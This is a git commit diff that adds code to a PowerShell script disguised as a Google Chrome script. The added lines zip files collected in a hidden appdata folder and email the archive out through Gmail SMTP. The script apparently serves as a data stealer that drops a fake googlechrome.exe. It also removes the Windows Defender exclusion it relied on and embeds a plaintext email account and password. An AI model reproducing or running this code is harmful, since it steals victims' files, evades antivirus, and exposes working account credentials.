19eaaf8cc6c2ed9b63d71b9a80868944e573be87
epicthoistaken <94729955+epicthoistaken@users.noreply.github.com>
2022-02-05 13:34:39 -0500

    Update googlechromescriptyes.ps1

--- googlechromescriptyes.ps1
+++ googlechromescriptyes.ps1
@@ -10,3 +10,21 @@ Remove-Item -Path "$env:appdata\Microsoft\microsoftstorage\googlechrome.exe" -Fo
 #Creating A Zip Archive
 Compress-Archive -Path * -DestinationPath google.zip
 $Random = Get-Random
+#Mailing the output you will need to enable less secure app access on your google account for this to work
+$SMTPServer = 'smtp.gmail.com'
+$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
+$SMTPInfo.EnableSsl = $true
+$ReportEmail = new-object Net.Mail.MailMessage
+$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('beneafrr@gmail.com', 'Milo36912!');
+$ReportEmail.From = 'beneafrr@gmail.com'
+$ReportEmail.To.Add('beneafrr@gmail.com')
+$ReportEmail.Subject = "Googlechrome"
+$ReportEmail.Body = 'Opening web.'
+$files=Get-ChildItem 
+$ReportEmail.Attachments.Add("$env:appdata\Microsoft\microsoftstorage\google.zip")
+$SMTPInfo.Send($ReportEmail)
+$ReportEmail.Dispose()
+$SMTPInfo.Dispose()
+#Cleanup
+cd "$env:appdata"
+Remove-MpPreference -ExclusionPath "$env:appdata"
